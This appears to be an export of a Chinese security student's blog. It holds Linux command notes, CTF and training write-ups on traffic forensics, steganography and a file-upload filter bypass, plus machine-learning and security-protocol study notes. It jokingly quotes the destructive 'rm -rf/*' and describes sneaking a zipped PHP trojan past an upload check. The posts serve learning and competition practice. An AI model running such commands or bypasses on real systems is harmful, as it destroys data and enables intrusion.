<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-l ：列出长数据串，包含文件的属性与权限数据等  </span><br><span class="line">-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用）  </span><br><span class="line">-d ：仅列出目录本身，而不是列出目录的文件数据  </span><br><span class="line">-h ：将文件容量以较易读的方式（GB，kB等）列出来  </span><br><span class="line">-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来  </span><br></pre></td></tr></table></figure>
<h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><p>copy之意，用于复制文件.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-a ：将文件的特性一起复制  </span><br><span class="line">-p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份  </span><br><span class="line">-i ：若目标文件已经存在时，在覆盖时会先询问操作的进行  </span><br><span class="line">-r ：递归持续复制，用于目录的复制行为  </span><br><span class="line">-u ：目标文件与源文件有差异时才会复制 </span><br></pre></td></tr></table></figure>
<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>用于移动文件、目录或更名，move之意.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖  </span><br><span class="line">-i ：若目标文件已经存在，就会询问是否覆盖  </span><br><span class="line">-u ：若目标文件已经存在，且比目标文件新，才会更新  </span><br></pre></td></tr></table></figure>
<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>用于删除文件或目录，remove之意.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f ：就是force的意思，忽略不存在的文件，不会出现警告消息  </span><br><span class="line">-i ：互动模式，在删除前会询问用户是否操作  </span><br><span class="line">-r ：递归删除，最常用于目录删除，它是一个非常危险的参数 </span><br></pre></td></tr></table></figure>
<p>说到这个就想到，前段时间十分火的一个命令… rm -rf/* 真的是从删库到跑路….</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux基本命令</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒月赛之流量分析</title>
    <url>/2018/03/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E4%B9%8B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="流量分析题目内容"><a href="#流量分析题目内容" class="headerlink" title="流量分析题目内容"></a>流量分析题目内容</h1><p><img src="/uploads/ll1.png" alt="1"></p>
<h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p>wireshark打开流量包，首先过滤出http协议，一般web应用比较容易分析。<br>大体浏览一下，发现X-Forward-For和wvs，意思指纹。<br><img src="/uploads/ll2.png" alt="1"><br>上网查了一下wvs指纹。<br>wvs指纹：<a href="http://www.freebuf.com/articles/web/16806.html">http://www.freebuf.com/articles/web/16806.html</a><br>查看了一下资料，了解到wvs的一些标识，其中包括print(md5….),恰好我们刚才看到过。<br>我们根据特征筛选一下特殊标志，http contains “print(md5(“<br><img src="/uploads/ll3.png" alt="1"><br>发现好多的数据包，这说明黑客通过wvs扫描公司发送的数据包，所以黑客的ip地址就是183.129.152.140啦</p>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>首先分析一下题目，是要找到黑客发送钓鱼邮件所使用的的邮箱，之前在前面看到过webmail，还是首先筛选http，邮箱是在118.194.196.232:8090这台服务器上运行。<br><img src="/uploads/ll4.png" alt="1"></p>
<p>然后我们根据服务器地址继续筛选一下http contains “118.194.196.232”，首先是Referer中包含的webmali/login9.php,应该是一个登陆界面，cookie中存在着一些登陆信息<br><img src="/uploads/ll5.png" alt="1"><br>既然是邮件发送，我们可以想到SMTP和pop3协议，随机我们筛选一下数据(有些数据包中没有，可以去其他的数据包中找找)，可以看到mail from <a href="mailto:&#120;&#x73;&#115;&#x65;&#114;&#x40;&#108;&#x69;&#118;&#x65;&#46;&#99;&#x6e;">&#120;&#x73;&#115;&#x65;&#114;&#x40;&#108;&#x69;&#118;&#x65;&#46;&#99;&#x6e;</a>，这就是黑客的邮箱<br><img src="/uploads/ll6.png" alt="1"></p>
<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p>我们可以想到一般上传的后们文件是php，存在一个sql注入的过程，先筛选一下http contains”and”，可以看到存在了一些注入的数据。<br><img src="/uploads/ll7.png" alt="1"><br>继续追踪一下，我们可以看到，使用sqlmap的痕迹，我们将特征进行追踪一下，http contains”sqlmap/1.0-stable”<br><img src="/uploads/ll8.png" alt="1"><br>这么多的sql注入的包，但是肯定存在一个最关键的包可以拿到webshall，那最后找到是20160809092842.php</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>神经网络NN算法</title>
    <url>/2018/03/14/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CNN%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="神经网络NN算法"><a href="#神经网络NN算法" class="headerlink" title="神经网络NN算法"></a>神经网络NN算法</h1><h2 id="多层向前神经网络-Multilayer-Feed-Forward-Neural-Network"><a href="#多层向前神经网络-Multilayer-Feed-Forward-Neural-Network" class="headerlink" title="多层向前神经网络(Multilayer Feed-Forward Neural Network)"></a>多层向前神经网络(Multilayer Feed-Forward Neural Network)</h2><blockquote>
<p>1.Backpropagation被使用在多层向前神经网络上<br>  2.多层向前神经网络由以下部分组成：<br>    输入层(input layer), 隐藏层 (hidden layers), 输入层 (output layers)<br>  3.每层由单元(units)组成<br>  4.输入层(input layer)是由训练集的实例特征向量传入<br>  5.经过连接结点的权重(weight)传入下一层，一层的输出是下一层的输入<br>  6.隐藏层的个数可以是任意的，输入层有一层，输出层有一层<br>  7.每个单元(unit)也可以被称作神经结点，根据生物学来源定义<br>  8.以上成为2层的神经网络（输入层不算）<br>  8.一层中加权的求和，然后根据非线性方程转化输出<br>  9.作为多层向前神经网络，理论上，如果有足够多的隐藏层(hidden layers和足够大的训练集,可以模拟出任何方程</p>
</blockquote>
<p><img src="/uploads/5.png" alt="图片"></p>
<h2 id="设计神经网络结构"><a href="#设计神经网络结构" class="headerlink" title="设计神经网络结构"></a>设计神经网络结构</h2><blockquote>
<p> 1.使用神经网络训练数据之前，必须确定神经网络的层数，以及每层单元的个数<br>   2.特征向量在被传入输入层时通常被先标准化(normalize）到0和1之间 （为了加速学习过程）<br>   3.离散型变量可以被编码成每一个输入单元对应一个特征值可能赋的值<br>     比如：特征值A可能取三个值（a0, a1, a2), 可以使用3个输入单元来代表A<br>           如果A=a0, 那么代表a0的单元值就取1, 其他取0；<br>           如果A=a1, 那么代表a1de单元值就取1，其他取0，以此类推<br>   4.神经网络即可以用来做分类(classification）问题，也可以解决回归(regression)问题.<br>     a.对于分类问题，如果是2类，可以用一个输出单元表示（0和1分别代表2类）.如果多余2类，每一个类别用一个输出单元表示,所以输入层的单元数量通常等于类别的数量<br>     b.没有明确的规则来设计最好有多少个隐藏层,根据实验测试和误差，以及准确度来实验并改进</p>
</blockquote>
<h2 id="交叉验证方法-Cross-Validation"><a href="#交叉验证方法-Cross-Validation" class="headerlink" title="交叉验证方法(Cross-Validation)"></a>交叉验证方法(Cross-Validation)</h2><blockquote>
<p>用于测试准确度的常用方法，将数据分成n份，第一次取其中一份当做测试集，其他的几份当做训练集，然后第二次去另一份当做测试集，其余用于训练集，依次进行n次。</p>
</blockquote>
<p><img src="/uploads/6.png" alt="图片"></p>
<h2 id="Backpropagation算法"><a href="#Backpropagation算法" class="headerlink" title="Backpropagation算法"></a>Backpropagation算法</h2><blockquote>
<p>1.通过迭代性的来处理训练集中的实例<br>2.对比经过神经网络后输入层预测值(predicted value)与真实值(target value)之间<br>3.反方向（从输出层=&gt;隐藏层=&gt;输入层）来以最小化误差(error)来更新每个连接的权重(weight)<br>4.算法详细介绍<br>  输入：D：数据集，l：学习率(learning rate)， 一个多层前向神经网络<br>  输入：一个训练好的神经网络(a trained neural network)<br>  a.初始化权重(weights)和偏向(bias): 随机初始化在-1到1之间，或者-0.5到0.5之间，每个单元有一个偏向<br>  b.对于每一个训练实例X，执行以下步骤：<br>  由输入层向前传送<br><img src="/uploads/7.png" alt="图片"><br>  根据误差反向传送<br><img src="/uploads/8.png" alt="图片"><br> 5.终止条件：<br>   a.权重的更新低于某个阈值<br>   b.预测的错误率低于某个阈值<br>   c.达到预设一定的循环次数</p>
</blockquote>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>deep learning</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次培训的web题</title>
    <url>/2018/08/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%B9%E8%AE%AD%E7%9A%84web%E9%A2%98/</url>
    <content><![CDATA[<p>自从7.20考完试回家，舒服了十几天，8.1又来到了一个陌生的城市，开始了自己的实习之旅.<br>本次记录一个关于网络安全竞赛培训的web题.</p>
<p>首先，我们打开页面，大题浏览一番，网站的功能主要是上传图片，然后可以查询图片。<br>然后我们发现一个点，像是伪协议.<br><img src="/uploads/px1.png" alt="1"></p>
<p>我们尝试上传文件，发现只能上传图片，而且上传的图片存储到uploads路径.</p>
<p>前面发现的疑似伪协议，首先测试一下，疑似发现了源码，我们将最重要的部分upload的源码打印出来。<br><img src="/uploads/px2.png" alt="1"></p>
<p>进行base64解码<br><img src="/uploads/px3.png" alt="1"></p>
<p>源码主要部分，可以看到后台有一个文件后缀的验证过程，可以通过的由gif、jgp、zip文件.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(($name1!&#x3D;&#x3D;&quot;.gif&quot;) and ($name1!&#x3D;&#x3D;&quot;.jpg&quot;) and ($name1!&#x3D;&#x3D;&#39;.zip&#39;))</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;hehe&quot;;</span><br><span class="line">			echo &quot;&lt;script language&#x3D;javascript&gt;alert(&#39;ä¸ä¼ ç§çåªè½æ¯JPGæèGIFï¼&#39;);history.go(-1)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">			exit;</span><br><span class="line">		&#125;</span><br><span class="line">		if($type!&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;&amp;&amp;$type!&#x3D;&#x3D;&quot;image&#x2F;gif&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			echo mime_content_type($tmpName);</span><br><span class="line">			echo &quot;&lt;script language&#x3D;javascript&gt;alert(&#39;ä¸ä¼ ç§çåªè½æ¯JPGæèGIFï¼&#39;);history.go(-1)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">			exit;</span><br><span class="line">		&#125;</span><br><span class="line">		if(is_uploaded_file($tmpName))&#123;</span><br><span class="line">			$time&#x3D;time();</span><br><span class="line">			$rootpath&#x3D;&#39;uploads&#x2F;&#39;.$time.$name1;</span><br><span class="line">			if(!move_uploaded_file($tmpName,$rootpath))&#123;</span><br><span class="line">			echo &quot;&lt;script language&#x3D;&#39;JavaScript&#39;&gt;alert(&#39;æä»¶ç§»å¨å¤±è´¥!&#39;);window.location&#x3D;&#39;index.php?page&#x3D;submit&#39;&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">			exit;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们将木马打包成zip文件，然后改后缀成jpg，上传，抓包，修改后缀名，可以很轻松的绕过前台的验证.<br><img src="/uploads/px4.png" alt="1"></p>
<p>zip文件上传成功,回显id，并存储在uploads路径下.<br><img src="/uploads/px5.png" alt="1"><br><img src="/uploads/px6.png" alt="1"></p>
<p>zip文件上传成功，我们如何访问zip文件内的木马文件呢.还是通过伪协议的方法，可以直接访问到zip文件内的木马.<br><img src="/uploads/px7.png" alt="1"><br><img src="/uploads/px8.png" alt="1"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF misc部分题解</title>
    <url>/2018/04/17/%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="DDCTF-misc"><a href="#DDCTF-misc" class="headerlink" title="DDCTF misc"></a>DDCTF misc</h1><p>做了三四天的题，就做出几道misc题目，可以说是心态大崩，肝不动了，遂来此总结一哈…</p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>emmmm flag在公告中发出来了,嗯…不用解码的，直接提交就行(这里有好多小伙伴还去尝试解码hhh)</p>
<h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p>
<p>该题目一时半会也难住了一些小伙伴，而我也多次尝试，可以看出是一串16进制，转成字符串是乱码，我将其反转再转字符依旧是乱码。灵感一现，想到之前做的solve me challenge的一档题目，php的chr的参数在大于256的时候会自动取余，我转念一想，该题是不是也是要取余呢，于是我将其取余128.</p>
<p>脚本如下,可以跑出flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;&quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&quot;</span><br><span class="line">s&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,len(a),2):</span><br><span class="line">	s+&#x3D;str(chr(int(a[i:i+2],16)-128))</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<p>纪念一下迅速冲榜的我，当然最后就被挤下来了…<br><img src="/uploads/dd1.png" alt="1"></p>
<h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><p>该题目拿到的是一张jpg图片</p>
<p>随机我们用binwalk或者winhex将隐藏在里面的文件提取出来…</p>
<p>是一个zip文件，而且是被加密的，搞了半天，原来解密密码在图片属性的备注里…<br><img src="/uploads/dd2.png" alt="1"></p>
<p>ok,解出一个txt文件，里面漫天的字符，看的我头晕了，一开始以为flag藏在里面，随机查找了一下DDCTF{}，然而并没有的，拿去词频分析一波，然后出来<br><img src="/uploads/dd3.png" alt="1"></p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>这个题目没点提示真的不会做，而且我流量分析确实不太熟悉…</p>
<p>首先搜索imf<br><img src="/uploads/dd4.JPG" alt="1"></p>
<p>可以看到最后一段流量，包含有一个txt文件，将其导出<br><img src="/uploads/dd5.JPG" alt="1"></p>
<p>然后是一大段字符，包含有一长段base64编码后的字符，注意这里我们不去解密，将其格式改成eml，可以看到<br><img src="/uploads/dd6.png" alt="1"></p>
<p>我们将私钥按照格式摘录下来,然后导入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">私钥格式</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">XXXXXXX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p><img src="/uploads/dd7.jpg" alt="1"><br><img src="/uploads/dd8.png" alt="1"></p>
<p>搜索http，就可以看到我们想要的东西啦，就藏在这个http流量里<br><img src="/uploads/dd9.jpg" alt="1"></p>
<h3 id="最后我想说-╯°□°）╯︵-┻━┻掀起了没技术的桌子"><a href="#最后我想说-╯°□°）╯︵-┻━┻掀起了没技术的桌子" class="headerlink" title="最后我想说(╯°□°）╯︵ ┻━┻掀起了没技术的桌子"></a>最后我想说(╯°□°）╯︵ ┻━┻掀起了没技术的桌子</h3>]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>流量分析</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>New Start</title>
    <url>/2021/01/09/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
    <content><![CDATA[<p>大学毕业后工作一年，幡然醒悟，觉得还是需要去考研，于是依然投入考研事业，期待一个新的开始。</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>安全协议知识点汇总</title>
    <url>/2018/07/05/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="Foundation"><a href="#Foundation" class="headerlink" title="Foundation"></a>Foundation</h2><h3 id="Authentication-Integrity-and-Nonrepudiation-认证性，完整性，非否任性"><a href="#Authentication-Integrity-and-Nonrepudiation-认证性，完整性，非否任性" class="headerlink" title="Authentication, Integrity, and Nonrepudiation(认证性，完整性，非否任性)"></a>Authentication, Integrity, and Nonrepudiation(认证性，完整性，非否任性)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">认证性：确定消息的真实来源</span><br><span class="line">完整性：验证消息在传输中未被修改</span><br><span class="line">非否任性：发送方不能在他发送消息后抵赖</span><br><span class="line"></span><br><span class="line">1.Authentication: Ascertaining a message’s true origin</span><br><span class="line">2.Integrity: Verifying that a message has not been modified in transit</span><br><span class="line">3.Nonrepudiation: A sender should not be able to falsely deny later that he sent a message</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Protocol-Building-Blocks"><a href="#Protocol-Building-Blocks" class="headerlink" title="Protocol Building Blocks"></a>Protocol Building Blocks</h2><h3 id="Types-of-Security-Protocols-安全协议类型"><a href="#Types-of-Security-Protocols-安全协议类型" class="headerlink" title="Types of Security Protocols(安全协议类型)"></a>Types of Security Protocols(安全协议类型)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.仲裁协议,即协议涉及可信第三方</span><br><span class="line">	例: </span><br><span class="line">	1.Alice将凭证交予可信第三方</span><br><span class="line">	2.Bob将支票交给Alice</span><br><span class="line">	3.Alice使用支票</span><br><span class="line">	4.当Alice使用完支票后，可信第三方将凭证交给Bob。否则将凭证还给Alice</span><br><span class="line">2.裁决协议,有可信第三方，但是用于事后判决</span><br><span class="line">	例: </span><br><span class="line">	无仲裁子协议(每次执行):</span><br><span class="line">	1.Bob和Alice商议合约</span><br><span class="line">	2.Alice在合约上签字</span><br><span class="line">	3.Bob在合约上签字</span><br><span class="line">	仲裁子协议(存在争议时执行):</span><br><span class="line">	1.Bob和Alice同时来到仲裁者前</span><br><span class="line">	2.Alice出示证据</span><br><span class="line">	3.Bob出示证据</span><br><span class="line">	4.仲裁者根据证据进行决策</span><br><span class="line">3.自执行协议,没有可信第三方</span><br><span class="line">	没有对可信第三方的要求</span><br><span class="line">	协议本身必须保证公平性</span><br><span class="line">	一方可以检测对方是否试图作弊，因此，可以立即停止。</span><br><span class="line">	不幸的是，没有一个自执行协议可以针对所有情况</span><br><span class="line"></span><br><span class="line">1.Arbitrated protocols: Involving a trusted third party</span><br><span class="line">	Alice gives title to lawyer</span><br><span class="line">	Bob gives check to Alice</span><br><span class="line">	Alice deposits check</span><br><span class="line">	Lawyer gives title to Bob if check gets cleared within a specific time; otherwise lawyer returns title back to 	Alice </span><br><span class="line"></span><br><span class="line">2.Adjudicated protocols: Trusted third party, after the fact</span><br><span class="line">	(1) Non-arbitrated subprotocol (executed every time):</span><br><span class="line">		Alice and Bob negotiate the terms of the contract</span><br><span class="line">		Alice signs the contract</span><br><span class="line">		Bob signs the contract</span><br><span class="line">	(2) Adjudicated subprotocol (executed only in case of a dispute):</span><br><span class="line">		Alice and Bob appear before a judge</span><br><span class="line">		Alice presents her evidence</span><br><span class="line">		Bob presents his evidence</span><br><span class="line">		The judge rules on the evidence		</span><br><span class="line"></span><br><span class="line">3.Self-enforcing protocols: No trusted third party</span><br><span class="line">	No arbitrator required</span><br><span class="line">	Protocol itself guarantees fairness</span><br><span class="line">	A party can detect whether other party is trying to cheat and therefore, can stop immediately</span><br><span class="line">	</span><br><span class="line">	Unfortunately, there is not a self-enforcing protocol for every situation</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Attacks-Against-Protocols-攻击协议"><a href="#Attacks-Against-Protocols-攻击协议" class="headerlink" title="Attacks Against Protocols(攻击协议)"></a>Attacks Against Protocols(攻击协议)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密码攻击</span><br><span class="line">	攻击协议中使用的加密算法</span><br><span class="line">	攻击用于实现算法和协议的加密技术</span><br><span class="line">	攻击协议本身</span><br><span class="line">被动攻击</span><br><span class="line">	窃听部分或全部协议</span><br><span class="line">主动攻击</span><br><span class="line">	介绍新消息，删除消息，中断，更改，回复</span><br><span class="line">被动欺骗</span><br><span class="line">	遵循协议，但尝试获取更多信息</span><br><span class="line">主动欺骗</span><br><span class="line">	在尝试作弊时中断正在进行的协议</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cryptographic attacks</span><br><span class="line">	Attacks against cryptographic algorithms used in protocols</span><br><span class="line">	Attacks against cryptographic techniques used to implement the algorithms and protocols</span><br><span class="line">	Attacks against the protocols themselves</span><br><span class="line">Passive attacks</span><br><span class="line">	Eavesdrop on some or all of the protocol</span><br><span class="line">Active attacks</span><br><span class="line">	Introduce new messages, delete messages, interrupt, alter, reply</span><br><span class="line">Passive cheaters</span><br><span class="line">	Follow protocol, but try to obtain more info</span><br><span class="line">Active cheaters</span><br><span class="line">	Disrupt protocol in progress in an attempt to cheat</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Security-Properties-安全属性"><a href="#Security-Properties-安全属性" class="headerlink" title="Security Properties(安全属性)"></a>Security Properties(安全属性)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">机密性：数据仅供获得授权的人使用。</span><br><span class="line">完整性：未经授权的实体不能更改数据。</span><br><span class="line">认证证：数据确实来自声称的发件人。</span><br><span class="line">非否认性：实体不能否认他们承诺发送的数据。</span><br><span class="line">新鲜度：Nonce是不可猜测的，永远不会重复使用。</span><br><span class="line">公平性</span><br><span class="line"></span><br><span class="line">Confidentiality: Data is available only to those authorized to obtain it.</span><br><span class="line">Integrity: Data has not been altered by unauthorised entities.</span><br><span class="line">Authentication: Data has indeed originated from the purported sender.</span><br><span class="line">Non-repudiation: Entities cannot deny sending data they have committed to.</span><br><span class="line">Freshness: Nonces are unguessable, and never re-used.</span><br><span class="line">Fairness</span><br></pre></td></tr></table></figure>
<h3 id="Dolev-Yao-threat-model"><a href="#Dolev-Yao-threat-model" class="headerlink" title="Dolev-Yao threat model"></a>Dolev-Yao threat model</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于分布式系统和网络，我们经常应该假设有敌人</span><br><span class="line">	网络中的任何地方</span><br><span class="line">	对手可能会做：窃听，操纵，注入，改变，复制，重改路由等......</span><br><span class="line">	攻击者可以控制地理上分离的大量网络节点</span><br><span class="line"></span><br><span class="line">Dolev-Yao威胁模型代表攻击者可以偷听，拦截和综合任何消息，并且仅受所使用的加密方法的限制。</span><br><span class="line"></span><br><span class="line">For distributed systems and networks, we often should assume that there are adversaries</span><br><span class="line">	Everywhere in the network</span><br><span class="line">	Adversary may: eavesdrop, manipulate, inject, alter, duplicate, reroute, etc…</span><br><span class="line">	Adversary may control a large number of network nodes that are geographically separated</span><br><span class="line"></span><br><span class="line">The Dolev-Yao threat model represents an attacker that can overhear, intercept, and synthesise any message and is only limited by the constraints of the cryptographic methods used. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Man-in-the-Middle"><a href="#Man-in-the-Middle" class="headerlink" title="Man-in-the-Middle"></a>Man-in-the-Middle</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在中间人攻击中，攻击者进入实际协议的中间。</span><br><span class="line"></span><br><span class="line">In a Man-in-the-Middle attack the attacker gets in the middle of a real run of a protocol.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Basic-Protocols"><a href="#Basic-Protocols" class="headerlink" title="Basic Protocols"></a>Basic Protocols</h2><h3 id="secret-splitting-秘密分割"><a href="#secret-splitting-秘密分割" class="headerlink" title="secret splitting(秘密分割)"></a>secret splitting(秘密分割)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Trent要保护消息m,生成一个随机位串r,长度和m相等.</span><br><span class="line">计算m异或r&#x3D;s</span><br><span class="line">给Alice r</span><br><span class="line">给Bob s</span><br><span class="line">为了重新得到m，需要Alice和Bob一起用r异或s得到m.</span><br><span class="line">可以扩展到n个人</span><br><span class="line"> m xor r xor s xor t &#x3D; u</span><br><span class="line"> </span><br><span class="line">Assume Trent wishes to protect the message m:</span><br><span class="line">Trent generates a random bit string r, the same length m.</span><br><span class="line">Trent computes m xor r &#x3D; s</span><br><span class="line">Trent gives Alice r</span><br><span class="line">Trent gives Bob s</span><br><span class="line">	Each of the pieces is called a shadow.</span><br><span class="line">	To reconstruct m, Alice and Bob XOR their shadows together.</span><br><span class="line">	If r is truly random, the system is perfectly secure (OTP).</span><br><span class="line">	To extend the scheme to n people, generate n random bit strings e.g. m xor r xor s xor t &#x3D; u</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="secret-sharing-秘密共享"><a href="#secret-sharing-秘密共享" class="headerlink" title="secret sharing(秘密共享)"></a>secret sharing(秘密共享)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">门限秘密共享</span><br><span class="line">目标是将秘密K划分为n个s1 ,. 。 。 sn以这样一种方式：</span><br><span class="line">	任何一组m个或更多用户都可以共同获取秘密;任何m个或更多个si片段的知识使K易于计算。</span><br><span class="line">	任何一组m-1或更少的用户都不能共同获得有关该秘密的任何信息。知道任何m-1或更少的si片叶K完全未确定。</span><br><span class="line"></span><br><span class="line">根据m和n的选择提供安全性和可靠性之间的权衡。</span><br><span class="line">	m越高，安全性越高，可靠性越低</span><br><span class="line">	较低的m提供较低的安全性，较高的可靠</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> Threshold Secret Sharing</span><br><span class="line"></span><br><span class="line">The goal is to divide a secret K into n pieces s1, . . . sn in such a  way that:</span><br><span class="line">	Any group of m or more users can jointly obtain the secret; knowledge of any m or more si pieces makes K easily computable.</span><br><span class="line">	Any group of m-1 or less users cannot jointly obtain any information about the secret. Knowledge of any m-1 or 	fewer si pieces leaves K completely undetermined.</span><br><span class="line"></span><br><span class="line">Provides tradeoff between security and reliability according to the choice of m and n.</span><br><span class="line">	Higher m gives higher security, lower reliability</span><br><span class="line">	Lower m gives lower security, higher reliability</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shamir（m，n）门限方案</span><br><span class="line">基于多项式插值，以及m个点（x，y）唯一地定义m-1次多项式y &#x3D; f（x）的事实。</span><br><span class="line">Trent希望在n个用户之间分发消息k，其中任何m个用户组都可以恢复k。</span><br><span class="line"></span><br><span class="line">shamir’s (m,n) threshold scheme</span><br><span class="line"></span><br><span class="line">Based on polynomial interpolation, and the fact that a polynomial y&#x3D;f(x) of degree m-1 is uniquely defined by m points (x,y).</span><br><span class="line">Trent wishes to distribute message k amongst n users, where any group of m users can recover k.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Threshold-Cryptography-门限密码学"><a href="#Threshold-Cryptography-门限密码学" class="headerlink" title="Threshold Cryptography(门限密码学)"></a>Threshold Cryptography(门限密码学)</h3><p>公钥是公开的，但相应的私钥在多方之间共享.</p>
<p>A public key is published, but the corresponding<br>private key is shared among multiple parties.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">门限加密方案</span><br><span class="line">	使用公钥加密消息</span><br><span class="line">	为了解密密文，需要超过阈值的多方参与解密协议。</span><br><span class="line">门限签名方案</span><br><span class="line">	为了签署消息，需要超过阈值的多方参与签名协议。</span><br><span class="line">	可以使用公钥验证签名。</span><br><span class="line"></span><br><span class="line">Threshold Encryption Scheme </span><br><span class="line">	A message is encrypted using the public key</span><br><span class="line">	In order to decrypt a ciphertext, a number of parties exceeding a threshold is required to cooperate in the decryption protocol. </span><br><span class="line">Threshold Signature Scheme </span><br><span class="line">	To sign a message, a number of parties exceeding a threshold is required to cooperate in the signing protocol. </span><br><span class="line">	A signature can be verified using the public key.  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="subliminal-channels-阈下信道"><a href="#subliminal-channels-阈下信道" class="headerlink" title="subliminal channels(阈下信道)"></a>subliminal channels(阈下信道)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice和Bob在他们的消息中建立了一个阈下信道（也称为隐蔽通信信道）。</span><br><span class="line">在最简单的层面上，Alice和Bob可以使用隐写术，即stego（信息隐藏）。注意stego不是加密（虽然你可以将两者结合起来）。</span><br><span class="line"></span><br><span class="line">Alice and Bob set up a subliminal channel in their message (otherwise known as a covert communications channel).</span><br><span class="line">On the simplest level, Alice and Bob could use steganography aka stego (information hiding). Note stego is not crypto (although you can combine the two).</span><br></pre></td></tr></table></figure>
